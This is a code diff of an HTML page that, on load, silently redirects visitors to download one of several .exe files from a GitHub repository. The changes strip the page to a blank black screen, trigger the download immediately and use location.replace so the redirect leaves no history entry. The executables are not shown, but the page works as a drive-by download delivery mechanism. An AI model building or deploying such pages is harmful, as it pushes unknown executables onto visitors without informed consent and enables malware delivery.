@@ -2,26 +2,20 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>File Downloads</title>
+    <title>Download</title>
     <style>
         body {
             background: #000000;
             margin: 0;
             padding: 0;
-            color: white;
-            font-family: Arial, sans-serif;
         }
     </style>
     <script>
-        // Get the filename from URL parameters
-        function getFileFromUrl() {
+        // Auto-download immediately
+        (function() {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('file');
-        }
-        
-        // Auto-download when page loads
-        window.onload = function() {
-            const file = getFileFromUrl();
+            const file = urlParams.get('file');
+            
             const downloadUrls = {
                 '1': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe',
                 '2': 'https://github.com/voidpardoxco/g/raw/refs/heads/master/2.exe',
@@ -29,13 +23,13 @@
             };
             
             if (file && downloadUrls[file]) {
-                // Redirect to download
-                window.location.href = downloadUrls[file];
+                // Force download immediately
+                window.location.replace(downloadUrls[file]);
             }
-        };
+        })();
     </script>
 </head>
 <body>
-    <!-- This page is intentionally mostly blank -->
+    <!-- Completely blank black page -->
 </body>
 </html>
